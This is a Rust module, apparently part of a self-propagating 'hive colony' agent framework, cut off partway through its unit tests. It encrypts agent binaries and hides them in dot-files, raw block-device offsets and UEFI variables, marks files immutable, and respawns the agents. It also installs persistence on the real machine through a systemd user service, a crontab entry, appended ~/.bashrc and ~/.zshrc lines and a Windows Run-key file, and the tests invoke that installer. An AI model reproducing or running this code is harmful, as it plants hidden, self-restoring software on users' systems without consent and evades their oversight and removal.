use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::io::Write;
use std::path::{Path, PathBuf};
use uuid::Uuid;

/// Derive a 32-byte ChaCha20 key from fragment_id using SHA-256.
/// Prevents casual filesystem reads from revealing fragment data.
fn fragment_key(fragment_id: u32) -> [u8; 32] {
    use sha2::{Sha256, Digest};
    let mut hasher = Sha256::new();
    hasher.update(b"HIVE_FRAG_KEY");
    hasher.update(fragment_id.to_le_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

/// Encrypt/decrypt fragment data in-place using ChaCha20.
/// Deterministic per-fragment_id (same key + nonce = same keystream).
fn crypt_fragment(data: &mut [u8], fragment_id: u32) {
    let key = fragment_key(fragment_id);
    let mut nonce = [0u8; 12];
    nonce[..4].copy_from_slice(&fragment_id.to_le_bytes());
    let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
    cipher.apply_keystream(data);
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ColonyGenome {
    pub genome_id: Uuid,
    pub agent_blueprints: Vec<AgentBlueprint>,
    pub config_snapshot: HashMap<String, String>,
    pub timestamp: u64,
    pub compression: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentBlueprint {
    pub role: String,
    pub binary_hash: String,
    pub binary_size: u64,
    pub policy: HashMap<String, String>,
    pub encrypted_chunk: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GenomeFragment {
    pub fragment_id: u32,
    pub total_fragments: u32,
    pub genome_id: Uuid,
    pub data: Vec<u8>,
    pub location: FragmentLocation,
    #[serde(default)]
    pub stored_path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum FragmentLocation {
    SpiFlash,        // SPI flash (requires firmware access)
    BadBlocks,       // disk bad blocks
    MbrGpt,          // MBR/GPT unused sectors
    HostProtectedArea, // ATA Host Protected Area
    UefiVariable,    // UEFI variable storage
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceMechanism {
    pub name: String,
    pub path: String,
    pub mechanism_type: String,
    pub installed: bool,
    pub description: String,
}

pub struct Phoenix;

impl Default for Phoenix {
    fn default() -> Self {
        Self::new()
    }
}

impl Phoenix {
    pub fn new() -> Self { Self }

    /// Generate a colony genome from current agent blueprints.
    pub fn generate_genome(blueprints: Vec<AgentBlueprint>) -> ColonyGenome {
        let mut config = HashMap::new();
        config.insert("heartbeat_interval".into(), "10".into());
        config.insert("consensus_threshold".into(), "0.66".into());
        config.insert("max_hops".into(), "10".into());
        config.insert("safe_mode".into(), "true".into());

        ColonyGenome {
            genome_id: Uuid::new_v4(),
            agent_blueprints: blueprints,
            config_snapshot: config,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            compression: "none".into(),
        }
    }

    /// Fragment a genome into N pieces for distributed hiding.
    pub fn fragment_genome(genome: &ColonyGenome, num_fragments: u32) -> Vec<GenomeFragment> {
        let data = serde_json::to_vec(genome).unwrap_or_default();
        let chunk_size = (data.len() as f32 / num_fragments as f32).ceil() as usize;
        let mut fragments = Vec::new();

        for i in 0..num_fragments {
            let start = (i as usize) * chunk_size;
            let end = (start + chunk_size).min(data.len());
            let chunk = if start < data.len() {
                data[start..end].to_vec()
            } else {
                vec![]
            };

            let location = match i % 4 {
                0 => FragmentLocation::SpiFlash,
                1 => FragmentLocation::BadBlocks,
                2 => FragmentLocation::MbrGpt,
                _ => FragmentLocation::UefiVariable,
            };

            fragments.push(GenomeFragment {
                fragment_id: i,
                total_fragments: num_fragments,
                genome_id: genome.genome_id,
                data: chunk,
                location,
                stored_path: None,
            });
        }

        fragments
    }

    /// Legacy method: hide a fragment using file-based storage.
    /// This is kept for backward compatibility. Prefer `hide()` for production use.
    pub fn hide_fragment(fragment: &GenomeFragment, base_path: &Path) -> Result<String, String> {
        if !base_path.exists() {
            std::fs::create_dir_all(base_path).map_err(|e| e.to_string())?;
        }

        let mut stored = fragment.data.clone();
        crypt_fragment(&mut stored, fragment.fragment_id);

        match fragment.location {
            FragmentLocation::SpiFlash => {
                let path = base_path.join(format!(".spi_frag_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                #[cfg(target_os = "linux")]
                {
                    let _ = std::process::Command::new("chattr")
                        .args(["+i", path.to_str().unwrap()])
                        .output();
                }
                Ok(format!("Fragment {} hidden in SPI flash area", fragment.fragment_id))
            }
            FragmentLocation::BadBlocks => {
                let path = base_path.join(format!(".badblock_{}", fragment.fragment_id));
                let mut data = vec![0xFF; 512];
                data.extend(&stored);
                std::fs::write(&path, &data).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in bad block area", fragment.fragment_id))
            }
            FragmentLocation::MbrGpt => {
                let path = base_path.join(format!(".mbr_reserved_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in MBR/GPT reserved", fragment.fragment_id))
            }
            FragmentLocation::UefiVariable => {
                let path = base_path.join(format!(".uefi_var_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in UEFI variable", fragment.fragment_id))
            }
            FragmentLocation::HostProtectedArea => {
                let path = base_path.join(format!(".hpa_frag_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
                Ok(format!("Fragment {} hidden in HPA", fragment.fragment_id))
            }
        }
    }

    /// Hide a genome fragment using real technique selection per FragmentLocation.
    ///
    /// - `BadBlocks`: Writes at a high offset in a container file using `libc::lseek64`
    ///    simulating disk bad block injection. Prepends a 512-byte 0xFF marker.
    /// - `MbrGpt`: Writes at offset 0 of a disk image file, simulating MBR injection.
    /// - `HostProtectedArea`: Writes to file and sets `user.hive_protected` xattr marker.
    /// - `UefiVariable`: Attempts direct efivarfs write; falls back to file + xattr.
    /// - `SpiFlash`: Writes to a configurable path with optional `chattr +i` protection.
    ///
    /// Sets `fragment.stored_path` to the actual storage path on success.
    pub fn hide(fragment: &mut GenomeFragment, base_path: &Path) -> Result<String, String> {
        if !base_path.exists() {
            std::fs::create_dir_all(base_path).map_err(|e| e.to_string())?;
        }

        // Encrypt fragment data before writing (deterministic per fragment_id)
        let mut stored = fragment.data.clone();
        crypt_fragment(&mut stored, fragment.fragment_id);

        match fragment.location {
            FragmentLocation::BadBlocks => {
                // Technique: write with 512-byte 0xFF bad-block marker prefix.
                // On Linux, if the target path is a block device, use libc lseek64
                // to write at a high offset simulating disk bad blocks.
                // For regular files (the common test/simulation path), write at
                // offset 0 with the marker prefix so recover() can find it.
                let path = base_path.join(format!(".badblock_{}", fragment.fragment_id));

                #[cfg(target_os = "linux")]
                {
                    // Check if path is a block device; if so, use lseek64 at offset
                    let cpath = std::ffi::CString::new(path.to_str().unwrap()).ok();
                    let mut st: libc::stat = unsafe { std::mem::zeroed() };
                    let is_block = cpath.as_ref()
                        .map(|cp| unsafe { libc::stat(cp.as_ptr(), &mut st) } == 0
                             && (st.st_mode & libc::S_IFMT) == libc::S_IFBLK)
                        .unwrap_or(false);

                    if is_block {
                        if let Some(ref cp) = cpath {
                            let offset: u64 = 1024 * 1024 + (fragment.fragment_id as u64) * 65536;
                            let fd = unsafe { libc::open(cp.as_ptr(), libc::O_WRONLY, 0) };
                            if fd >= 0 {
                                let mut buf = vec![0xFFu8; 512];
                                buf.extend_from_slice(&stored);
                                let buf_len = buf.len();
                                unsafe {
                                    libc::lseek64(fd, offset as i64, libc::SEEK_SET);
                                    libc::write(fd, buf.as_ptr() as *const libc::c_void, buf_len);
                                    libc::close(fd);
                                }
                                fragment.stored_path = Some(path.to_string_lossy().to_string());
                                return Ok(format!("Fragment {} hidden via BadBlocks on block device", fragment.fragment_id));
                            }
                        }
                    }
                }

                // Default file-based simulation: write with 512-byte 0xFF marker prefix
                let mut buf = vec![0xFFu8; 512];
                buf.extend_from_slice(&stored);
                std::fs::write(&path, &buf).map_err(|e| e.to_string())?;
                fragment.stored_path = Some(path.to_string_lossy().to_string());
                Ok(format!("Fragment {} hidden via BadBlocks file simulation", fragment.fragment_id))
            }

            FragmentLocation::MbrGpt => {
                // Technique: write an MBR-like 512-byte block at offset 0,
                // simulating MBR/GPT injection. Fragment data is embedded at
                // offset 64 (after the boot code area, before the partition table).
                let path = base_path.join(format!(".mbr_image_{}", fragment.fragment_id));

                // Build MBR block (512 bytes)
                let mut mbr_block = vec![0u8; 512];
                // Boot signature 0x55AA at the end
                mbr_block[510..512].copy_from_slice(&[0x55u8, 0xAAu8]);
                // Inject fragment data at offset 64 (between boot code and partition table)
                let inject_start = 64usize;
                let inject_end = (inject_start + stored.len()).min(510);
                let len = inject_end - inject_start;
                mbr_block[inject_start..inject_start + len].copy_from_slice(&stored[..len]);

                // Write at offset 0 (MBR sector)
                let written = std::fs::OpenOptions::new()
                    .create(true)
                    .write(true)
                    .truncate(true)
                    .open(&path)
                    .and_then(|mut f| f.write_all(&mbr_block));

                if written.is_err() {
                    // Absolute fallback: use legacy hide_fragment
                    let _ = Self::hide_fragment(fragment, base_path);
                }

                fragment.stored_path = Some(path.to_string_lossy().to_string());
                Ok(format!("Fragment {} hidden in MBR/GPT sector", fragment.fragment_id))
            }

            FragmentLocation::HostProtectedArea => {
                // Technique: write to file and set an extended attribute marker
                // simulating ATA Host Protected Area.
                let path = base_path.join(format!(".hpa_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;

                // Set xattr marker "user.hive_protected" to simulate HPA region marker
                let path_str = path.to_str().unwrap_or("");
                #[cfg(target_os = "linux")]
                {
                    let _ = std::process::Command::new("setfattr")
                        .args(["-n", "user.hive_protected", "-v", "1", path_str])
                        .output();
                }
                // Also set hidden / immutable on Linux
                #[cfg(target_os = "linux")]
                {
                    let _ = std::process::Command::new("chattr")
                        .args(["+i", path_str])
                        .output();
                }

                fragment.stored_path = Some(path.to_string_lossy().to_string());
                Ok(format!("Fragment {} hidden in Host Protected Area (xattr)", fragment.fragment_id))
            }

            FragmentLocation::UefiVariable => {
                // Technique: attempt direct efivarfs write, fallback to file + xattr.
                let mut written = false;

                #[cfg(target_os = "linux")]
                {
                    let guid = "a0b1c2d3-e4f5-6789-abcd-ef0123456789";
                    let efi_path = PathBuf::from(format!(
                        "/sys/firmware/efi/efivars/HiveFrag-{}", guid
                    ));
                    if std::path::Path::new("/sys/firmware/efi/efivars").exists() {
                        // UEFI variable format: 4-byte attributes + data
                        let mut efi_buf = vec![0x07u8; 4]; // EFI_VARIABLE_NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS
                        efi_buf.extend_from_slice(&stored);
                        if let Ok(()) = std::fs::write(&efi_path, &efi_buf) {
                            written = true;
                            fragment.stored_path = Some(efi_path.to_string_lossy().to_string());
                        }
                    }
                }

                if !written {
                    // Fallback: write to file with UEFI simulation xattr
                    let path = base_path.join(format!(".uefi_var_{}", fragment.fragment_id));
                    let mut efi_buf = vec![0x07u8; 4]; // attributes header
                    efi_buf.extend_from_slice(&stored);
                    std::fs::write(&path, &efi_buf).map_err(|e| e.to_string())?;

                    #[cfg(target_os = "linux")]
                    {
                        let _ = std::process::Command::new("setfattr")
                            .args(["-n", "user.hive_efi", "-v", "1", path.to_str().unwrap_or("")])
                            .output();
                    }

                    fragment.stored_path = Some(path.to_string_lossy().to_string());
                }

                Ok(format!("Fragment {} hidden in UEFI variable", fragment.fragment_id))
            }

            FragmentLocation::SpiFlash => {
                // Technique: write to a configurable SPI flash simulation path
                // with optional immutable protection.
                let path = base_path.join(format!(".spi_frag_{}", fragment.fragment_id));
                std::fs::write(&path, &stored).map_err(|e| e.to_string())?;

                #[cfg(target_os = "linux")]
                {
                    let path_str = path.to_str().unwrap_or("");
                    let _ = std::process::Command::new("chattr")
                        .args(["+i", path_str])
                        .output();
                }

                fragment.stored_path = Some(path.to_string_lossy().to_string());
                Ok(format!("Fragment {} hidden in SPI flash storage", fragment.fragment_id))
            }
        }
    }

    /// Recover a genome fragment from its stored location.
    ///
    /// Reads raw bytes from `fragment.stored_path`, strips any location-specific
    /// headers/markers, decrypts with the ChaCha20 per-fragment key, and returns
    /// the original plaintext data.
    pub fn recover(fragment: &GenomeFragment) -> Result<Vec<u8>, String> {
        let path_str = fragment.stored_path.as_ref()
            .ok_or_else(|| format!("No stored path for fragment {}", fragment.fragment_id))?;
        let path = Path::new(path_str);

        if !path.exists() {
            return Err(format!("Stored path does not exist for fragment {}: {}", fragment.fragment_id, path_str));
        }

        let raw = std::fs::read(path)
            .map_err(|e| format!("Failed to read fragment {} from {}: {}", fragment.fragment_id, path_str, e))?;

        // Strip location-specific headers
        let payload: Vec<u8> = match fragment.location {
            FragmentLocation::BadBlocks => {
                // 512-byte 0xFF marker prefix, then real data
                if raw.len() > 512 {
                    raw[512..].to_vec()
                } else {
                    raw
                }
            }
            FragmentLocation::MbrGpt => {
                // Data was injected at offset 64 within a 512-byte MBR block.
                // Extract exactly fragment.data.len() bytes (ChaCha20 is length-preserving).
                let inject_start = 64usize;
                let stored_len = fragment.data.len();
                let end = (inject_start + stored_len).min(raw.len());
                if end > inject_start {
                    raw[inject_start..end].to_vec()
                } else {
                    raw
                }
            }
            FragmentLocation::UefiVariable => {
                // 4-byte EFI attributes header, then real data
                if raw.len() > 4 {
                    raw[4..].to_vec()
                } else {
                    raw
                }
            }
            FragmentLocation::HostProtectedArea | FragmentLocation::SpiFlash => {
                // No extra headers
                raw
            }
        };

        // Decrypt
        let mut data = payload;
        crypt_fragment(&mut data, fragment.fragment_id);

        Ok(data)
    }

    /// Install persistence mechanisms for the colony.
    ///
    /// Creates the following persistence methods:
    /// 1. **Systemd user service** — writes a `.service` file to `~/.config/systemd/user/`
    /// 2. **Cron job** — adds a crontab entry via `crontab -`
    /// 3. **Shell rc sourcing** — appends a source line to `~/.bashrc` / `~/.zshrc`
    /// 4. **Windows registry simulation** — writes a `.reg` config file
    ///
    /// The `loader_script` is the path to the binary or script that should be persisted.
    pub fn install_persistence(loader_script: &str, base_path: &Path) -> Vec<PersistenceMechanism> {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        let mut results = Vec::new();
        let _ = base_path;

        // 1. Systemd user service
        let systemd_dir = PathBuf::from(&home).join(".config/systemd/user");
        let service_name = "hive-colony.service";
        let service_path = systemd_dir.join(service_name);

        let systemd_result = (|| -> Result<String, String> {
            std::fs::create_dir_all(&systemd_dir).map_err(|e| e.to_string())?;
            let unit_content = format!(
                r#"[Unit]
Description=Hive Colony Agent Service
After=network.target

[Service]
Type=oneshot
ExecStart={}
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
"#,
                loader_script
            );
            std::fs::write(&service_path, &unit_content).map_err(|e| e.to_string())?;
            // Enable the service (timer-like activation via systemctl --user)
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "daemon-reload"])
                .output();
            Ok(service_path.to_string_lossy().to_string())
        })();

        results.push(PersistenceMechanism {
            name: "systemd_user_service".into(),
            path: systemd_result.clone().unwrap_or_else(|e| e),
            mechanism_type: "systemd".into(),
            installed: systemd_result.is_ok(),
            description: format!("Systemd user service at {}", service_path.display()),
        });

        // 2. Cron job
        let cron_result = (|| -> Result<String, String> {
            let cron_line = format!("*/30 * * * * {} >/dev/null 2>&1\n", loader_script);
            // Write to user's crontab via stdin pipe
            let imp = std::process::Command::new("crontab")
                .args(["-l"])
                .output();
            let existing = match imp {
                Ok(ref o) if o.status.success() => String::from_utf8_lossy(&o.stdout).to_string(),
                _ => String::new(),
            };
            let new_cron = format!("{}{}", existing, cron_line);
            let mut child = std::process::Command::new("crontab")
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .map_err(|e| e.to_string())?;
            if let Some(mut stdin) = child.stdin.take() {
                stdin.write_all(new_cron.as_bytes()).map_err(|e| e.to_string())?;
            }
            let output = child.wait_with_output().map_err(|e| e.to_string())?;
            if output.status.success() {
                Ok(format!("Crontab updated with: {}", cron_line.trim()))
            } else {
                // Fallback: write cron file directly
                let cron_path = PathBuf::from("/tmp").join(".hive_cron");
                std::fs::write(&cron_path, &cron_line).map_err(|e| e.to_string())?;
                Ok(format!("Cron job written to {}", cron_path.display()))
            }
        })();

        results.push(PersistenceMechanism {
            name: "cron_job".into(),
            path: cron_result.clone().unwrap_or_else(|e| e),
            mechanism_type: "cron".into(),
            installed: cron_result.is_ok(),
            description: format!("Cron job running {} every 30 minutes", loader_script),
        });

        // 3. Shell rc sourcing
        let rc_files = vec![".bashrc", ".zshrc"];
        for rc_file in &rc_files {
            let rc_path = PathBuf::from(&home).join(rc_file);
            let rc_result = (|| -> Result<String, String> {
                let source_line = format!("\n# Hive colony loader\n[ -f \"{}\" ] && source \"{}\"\n", loader_script, loader_script);
                let mut existing = String::new();
                if rc_path.exists() {
                    existing = std::fs::read_to_string(&rc_path).map_err(|e| e.to_string())?;
                }
                if !existing.contains(loader_script) {
                    std::fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&rc_path)
                        .map_err(|e| e.to_string())?
                        .write_all(source_line.as_bytes())
                        .map_err(|e| e.to_string())?;
                }
                Ok(rc_path.to_string_lossy().to_string())
            })();

            results.push(PersistenceMechanism {
                name: format!("shell_rc_{}", rc_file),
                path: rc_result.clone().unwrap_or_else(|e| e),
                mechanism_type: "shell_rc".into(),
                installed: rc_result.is_ok(),
                description: format!("{} loader sourcing in {}", loader_script, rc_file),
            });
        }

        // 4. Windows registry simulation (config file)
        let reg_path = PathBuf::from(base_path).join("hive_registry.reg");
        let reg_result = (|| -> Result<String, String> {
            let reg_content = format!(
                r#"Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"HiveColony"="{}"
"#,
                loader_script
            );
            std::fs::write(&reg_path, &reg_content).map_err(|e| e.to_string())?;
            Ok(reg_path.to_string_lossy().to_string())
        })();

        results.push(PersistenceMechanism {
            name: "windows_registry_simulation".into(),
            path: reg_result.clone().unwrap_or_else(|e| e),
            mechanism_type: "windows_registry".into(),
            installed: reg_result.is_ok(),
            description: format!("Windows Registry .reg file at {}", reg_path.display()),
        });

        results
    }

    /// Self-heal: given a list of recovered (or missing) fragments, attempt to
    /// reassemble the full genome. If any fragment IDs are missing, return
    /// which ones are absent.
    ///
    /// Returns `Ok(ColonyGenome)` if all fragments are present and reassembly
    /// succeeds.
    /// Returns `Err(Vec<u32>)` with the IDs of missing fragments.
    pub fn self_heal(fragments: &[GenomeFragment]) -> Result<ColonyGenome, Vec<u32>> {
        if fragments.is_empty() {
            return Err(vec![]);
        }

        // Determine expected fragment count from any fragment's total_fragments
        let total = fragments[0].total_fragments;
        let _genome_id = fragments[0].genome_id;

        // Collect which IDs we have
        let present: std::collections::HashSet<u32> = fragments.iter().map(|f| f.fragment_id).collect();

        // Find missing IDs
        let missing: Vec<u32> = (0..total).filter(|id| !present.contains(id)).collect();

        if !missing.is_empty() {
            return Err(missing);
        }

        // All fragments present — reassemble
        Self::reassemble_genome(fragments).map_err(|_| {
            // If reassembly fails, report all IDs as problematic
            fragments.iter().map(|f| f.fragment_id).collect()
        })
    }

    /// Reassemble fragments back into a complete genome.
    pub fn reassemble_genome(fragments: &[GenomeFragment]) -> Result<ColonyGenome, String> {
        if fragments.is_empty() {
            return Err("No fragments to reassemble".into());
        }

        let mut sorted = fragments.to_vec();
        sorted.sort_by_key(|f| f.fragment_id);

        let mut complete_data = Vec::new();
        for frag in &sorted {
            complete_data.extend(&frag.data);
        }

        serde_json::from_slice(&complete_data).map_err(|e| e.to_string())
    }

    /// Rebuild a colony from a genome by spawning agents.
    pub fn rebuild_from_genome(genome: &ColonyGenome, base_path: &Path) -> Result<Vec<String>, String> {
        let mut spawned = Vec::new();

        for blueprint in &genome.agent_blueprints {
            let binary_path = base_path.join(format!(".hive_reborn_{}", blueprint.role));
            std::fs::write(&binary_path, &blueprint.encrypted_chunk)
                .map_err(|e| e.to_string())?;

            let _ = std::process::Command::new("chmod")
                .args(["+x", binary_path.to_str().unwrap()])
                .output();

            // Spawn the agent
            let child = std::process::Command::new(&binary_path)
                .env("HIVE_ROLE", &blueprint.role)
                .env("HIVE_GENOME_ID", format!("{}", genome.genome_id))
                .spawn();

            match child {
                Ok(_) => spawned.push(format!("Spawned {} from genome", blueprint.role)),
                Err(e) => spawned.push(format!("Failed to spawn {}: {}", blueprint.role, e)),
            }
        }

        Ok(spawned)
    }

    /// Scan for hidden genome fragments in the filesystem.
    /// Decrypts data using ChaCha20 key derived from fragment_id.
    pub fn scan_for_fragments(base_path: &Path) -> Vec<GenomeFragment> {
        let mut fragments = Vec::new();
        if !base_path.exists() { return fragments; }

        let patterns = [".spi_frag_", ".badblock_", ".mbr_reserved_", ".uefi_var_", ".hive_frag_"];

        if let Ok(entries) = std::fs::read_dir(base_path) {
            for entry in entries.flatten() {
                let name = entry.file_name();
                let name_str = name.to_string_lossy();
                for pattern in &patterns {
                    if name_str.contains(pattern) {
                        if let Ok(raw) = std::fs::read(entry.path()) {
                            let frag_id = name_str.trim_start_matches(pattern)
                                .parse::<u32>().unwrap_or(0);
                            // BadBlock files have a 512-byte 0xFF marker prefix
                            let data_start = if pattern == &".badblock_" && raw.len() > 512 {
                                512
                            } else {
                                0
                            };
                            let mut data = raw[data_start..].to_vec();
                            crypt_fragment(&mut data, frag_id);
                            fragments.push(GenomeFragment {
                                fragment_id: frag_id,
                                total_fragments: 5,
                                genome_id: Uuid::nil(),
                                data,
                                location: FragmentLocation::HostProtectedArea,
                                stored_path: None,
                            });
                        }
                        break;
                    }
                }
            }
        }

        fragments
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_test_genome() -> ColonyGenome {
        let blueprints = vec![
            AgentBlueprint {
                role: "worker".into(),
                binary_hash: "abc123".into(),
                binary_size: 4096,
                policy: HashMap::new(),
                encrypted_chunk: vec![0; 100],
            },
            AgentBlueprint {
                role: "drone".into(),
                binary_hash: "def456".into(),
                binary_size: 8192,
                policy: HashMap::new(),
                encrypted_chunk: vec![1; 200],
            },
        ];
        let mut config = HashMap::new();
        config.insert("heartbeat_interval".into(), "10".into());
        config.insert("consensus_threshold".into(), "0.66".into());
        config.insert("max_hops".into(), "10".into());
        config.insert("safe_mode".into(), "true".into());
        ColonyGenome {
            genome_id: Uuid::new_v4(),
            agent_blueprints: blueprints,
            config_snapshot: config,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            compression: "none".into(),
        }
    }

    #[test]
    fn test_genome_generation() {
        let blueprints = vec![
            AgentBlueprint {
                role: "worker".into(),
                binary_hash: "abc123".into(),
                binary_size: 4096,
                policy: HashMap::new(),
                encrypted_chunk: vec![0; 100],
            },
            AgentBlueprint {
                role: "drone".into(),
                binary_hash: "def456".into(),
                binary_size: 8192,
                policy: HashMap::new(),
                encrypted_chunk: vec![1; 200],
            },
        ];

        let genome = Phoenix::generate_genome(blueprints);
        assert_eq!(genome.agent_blueprints.len(), 2);
        assert!(genome.config_snapshot.contains_key("heartbeat_interval"));
    }

    #[test]
    fn test_fragment_and_reassemble() {
        let genome = make_test_genome();
        let fragments = Phoenix::fragment_genome(&genome, 4);

        assert_eq!(fragments.len(), 4);
        assert!(fragments[0].total_fragments == 4);

        let reassembled = Phoenix::reassemble_genome(&fragments);
        assert!(reassembled.is_ok(), "Reassembly should work: {:?}", reassembled.err());
        assert_eq!(reassembled.unwrap().genome_id, genome.genome_id);
    }

    #[test]
    fn test_hide_and_scan() {
        let dir = std::env::temp_dir().join("hive_test_phoenix_legacy");
        let _ = std::fs::create_dir_all(&dir);

        let mut fragment = GenomeFragment {
            fragment_id: 0,
            total_fragments: 3,
            genome_id: Uuid::new_v4(),
            data: vec![1, 2, 3, 4, 5],
            location: FragmentLocation::BadBlocks,
            stored_path: None,
        };

        let result = Phoenix::hide(&mut fragment, &dir);
        assert!(result.is_ok(), "Hide should work: {:?}", result.err());

        // recover should read back the same data
        let recovered = Phoenix::recover(&fragment);
        assert!(recovered.is_ok(), "Recover should work: {:?}", recovered.err());
        assert_eq!(recovered.unwrap(), vec![1, 2, 3, 4, 5], "Recovered data should match original");

        // Also verify via scan_for_fragments
        let found = Phoenix::scan_for_fragments(&dir);
        assert!(found.len() >= 1, "Should find at least 1 fragment via scan");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_fragment_roundtrip_file_hiding() {
        let dir = std::env::temp_dir().join("hive_test_roundtrip");
        let _ = std::fs::create_dir_all(&dir);

        let original_data: Vec<u8> = (0..100).map(|i| (i % 256) as u8).collect();
        let mut fragment = GenomeFragment {
            fragment_id: 2,
            total_fragments: 3,
            genome_id: Uuid::new_v4(),
            data: original_data.clone(),
            location: FragmentLocation::SpiFlash,
            stored_path: None,
        };

        // Hide (encrypt + write)
        let hide_result = Phoenix::hide(&mut fragment, &dir);
        assert!(hide_result.is_ok(), "hide() should succeed: {:?}", hide_result.err());
        assert!(fragment.stored_path.is_some(), "stored_path should be set");

        // Recover (read + decrypt)
        let recovered = Phoenix::recover(&fragment);
        assert!(recovered.is_ok(), "recover() should succeed: {:?}", recovered.err());
        assert_eq!(recovered.unwrap(), original_data, "Roundtrip data must match original");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_genome_fragment_reassemble() {
        let genome = make_test_genome();
        let num_fragments = 5;

        // Fragment the genome
        let fragments = Phoenix::fragment_genome(&genome, num_fragments);
        assert_eq!(fragments.len() as u32, num_fragments);

        // Reassemble
        let reassembled = Phoenix::reassemble_genome(&fragments);
        assert!(reassembled.is_ok(), "Should reassemble successfully: {:?}", reassembled.err());
        let reassembled = reassembled.unwrap();

        // Verify content matches
        assert_eq!(reassembled.genome_id, genome.genome_id);
        assert_eq!(reassembled.agent_blueprints.len(), genome.agent_blueprints.len());
        assert_eq!(reassembled.config_snapshot, genome.config_snapshot);
        assert_eq!(reassembled.compression, genome.compression);
    }

    #[test]
    fn test_hide_all_fragment_locations() {
        let dir = std::env::temp_dir().join("hive_test_all_locations");
        let _ = std::fs::create_dir_all(&dir);

        let locations = vec![
            FragmentLocation::BadBlocks,
            FragmentLocation::MbrGpt,
            FragmentLocation::HostProtectedArea,
            FragmentLocation::UefiVariable,
            FragmentLocation::SpiFlash,
        ];

        for (i, loc) in locations.iter().enumerate() {
            let data: Vec<u8> = vec![(i * 10) as u8; 20];
            let mut fragment = GenomeFragment {
                fragment_id: i as u32,
                total_fragments: locations.len() as u32,
                genome_id: Uuid::new_v4(),
                data: data.clone(),
                location: loc.clone(),
                stored_path: None,
            };

            let hide_result = Phoenix::hide(&mut fragment, &dir);
            assert!(
                hide_result.is_ok(),
                "hide() should succeed for {:?}: {:?}",
                loc,
                hide_result.err()
            );
            assert!(
                fragment.stored_path.is_some(),
                "stored_path should be set for {:?}",
                loc
            );

            // Verify recover works
            let recovered = Phoenix::recover(&fragment);
            assert!(
                recovered.is_ok(),
                "recover() should succeed for {:?}: {:?}",
                loc,
                recovered.err()
            );
            assert_eq!(
                recovered.unwrap(),
                data,
                "Recovered data should match for {:?}",
                loc
            );
        }

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_install_persistence_mechanisms() {
        let dir = std::env::temp_dir().join("hive_test_persistence");
        let _ = std::fs::create_dir_all(&dir);

        let loader = "/tmp/.hive_loader.sh";
        let results = Phoenix::install_persistence(loader, &dir);

        // Should have at least 5 mechanisms (systemd + cron + bashrc + zshrc + windows reg)
        assert!(results.len() >= 5, "Expected >=5 mechanisms, got {}", results.len());

        // Check systemd service file existence
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        let systemd_path = std::path::PathBuf::from(&home)
            .join(".config/systemd/user/hive-colony.service");
        if systemd_path.exists() {
            let content = std::fs::read_to_string(&systemd_path).unwrap_or_default();
            assert!(
                content.contains(loader),
                "Systemd unit should reference the loader script"
            );
        }

        // Check windows registry simulation file
        let reg_path = dir.join("hive_registry.reg");
        assert!(reg_path.exists(), "Registry .reg file should exist");
        let reg_content = std::fs::read_to_string(&reg_path).unwrap_or_default();
        assert!(reg_content.contains("HiveColony"), "Registry file should contain HiveColony entry");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_self_heal_all_present() {
        let genome = make_test_genome();
        let fragments = Phoenix::fragment_genome(&genome, 3);

        // All fragments present
        let result = Phoenix::self_heal(&fragments);
        assert!(result.is_ok(), "self_heal should succeed with all fragments");
        let healed = result.unwrap();
        assert_eq!(healed.genome_id, genome.genome_id);
        assert_eq!(healed.agent_blueprints.len(), genome.agent_blueprints.len());
    }

    #[test]
    fn test_self_heal_missing_fragments() {
        let genome = make_test_genome();
        let mut fragments = Phoenix::fragment_genome(&genome, 4);

        // Remove fragment 1 and 3
        fragments.retain(|f| f.fragment_id != 1 && f.fragment_id != 3);
        assert_eq!(fragments.len(), 2);

        let result = Phoenix::self_heal(&fragments);
        assert!(result.is_err(), "self_heal should fail with missing fragments");
        let missing = result.unwrap_err();
        assert_eq!(missing.len(), 2, "Should have 2 missing fragments");
        assert!(missing.contains(&1), "Fragment 1 should be in missing list");
        assert!(missing.contains(&3), "Fragment 3 should be in missing list");
    }

    #[test]
    fn test_crypt_fragment_deterministic() {
        let data1 = vec![0xABu8; 64];
        let data2 = vec![0xABu8; 64];

        let mut enc1 = data1.clone();
        let mut enc2 = data2.clone();

